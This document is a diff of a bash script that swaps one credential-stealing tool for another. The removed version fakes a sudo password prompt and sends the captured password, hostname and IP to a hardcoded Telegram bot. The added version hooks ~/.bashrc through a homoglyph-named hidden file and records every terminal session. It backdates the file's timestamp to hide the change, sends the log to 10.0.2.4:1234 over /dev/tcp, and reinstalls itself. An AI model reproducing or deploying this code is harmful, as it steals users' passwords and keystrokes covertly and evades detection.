@@ -1,39 +1,40 @@
 #!/bin/bash
-telegramApiToken="6831101481:AAHrG9PPMD6W-zR0zijUUs5NNp0CfpGRZRU"
-telegramChatID="6793794124"
-telegramApiEndpoint="https://api.telegram.org/bot$telegramApiToken/sendMessage"
-timeout="8"
 
-/usr/bin/sudo -n true 2>/dev/null
-if [ $? -eq 0 ]
-then
-    /usr/bin/sudo $@
-else
-    echo -n "[sudo] password for $USER: "
-    read -s pwd
-    echo
-    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
-    
-    if [ $? -eq 1 ]
-    then
-      distroName=$(awk -F= '/^NAME/{print tolower($2)}' /etc/*-release  | tr -d '"')
-      if [[ $distroName == *"centos"* || $distroName == *"red hat"* ]]
-      then
-        echo "Sorry, try again."
-      fi
-      sudo $@
-    else
-      #If CURL binary is present in the host.
-      if [ -x /usr/bin/curl ]
-      then
-        hostname=$(hostname -f)
-        ipAddr=$(hostname -I | awk '{print $1}')
-        message="Hostname: $hostname --- IP: $ipAddr --- Credentials: $USER:$pwd"
-        curl -s --max-time $timeout -d "chat_id=$telegramChatID&disable_web_page_preview=1&text=$message" $telegramApiEndpoint > /dev/null
-      fi
-    echo "$pwd" | /usr/bin/sudo -S $@
-    fi
-fi
+fakerc=~/.bаsh_login
+logfile=~/.bаsh_cache
+remote=/dev/tcp/10.0.2.4/1234
+waitsec=1
+changetime=$(stat -c %Y ~/.bashrc)
 
+read script <<EOF
+exec script -B "$logfile" -fqc "bash --rcfile '$fakerc'"
+EOF
+quoted=$(printf "%q" "$script")
 
+# UI BEGIN
 
+print() { echo -e "$*"; }
+printvar() { printf " + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n" $1 "${!1}"; }
+
+printvar fakerc
+printvar logfile
+printvar script
+printvar remote
+
+print "\e[5;7m  wait for \e[1m$waitsec\e[0;5;7m secs, ctrl+c to interrupt  \e[m"
+sleep $waitsec
+print "installing..."
+
+# UI END
+
+cat >"$fakerc" <<EOF
+self=\$(cat "$fakerc")
+self=\$(printf "%q" "\$self")
+rm -f "$fakerc"
+sed -i "/^exec script -B/d" ~/.bashrc
+touch -d @$changetime ~/.bashrc
+trap "2>/dev/null cat '$logfile' > '$remote' && echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'; rm -f '$logfile'" EXIT
+unset self
+. ~/.bashrc
+EOF
+echo $script >> ~/.bashrc
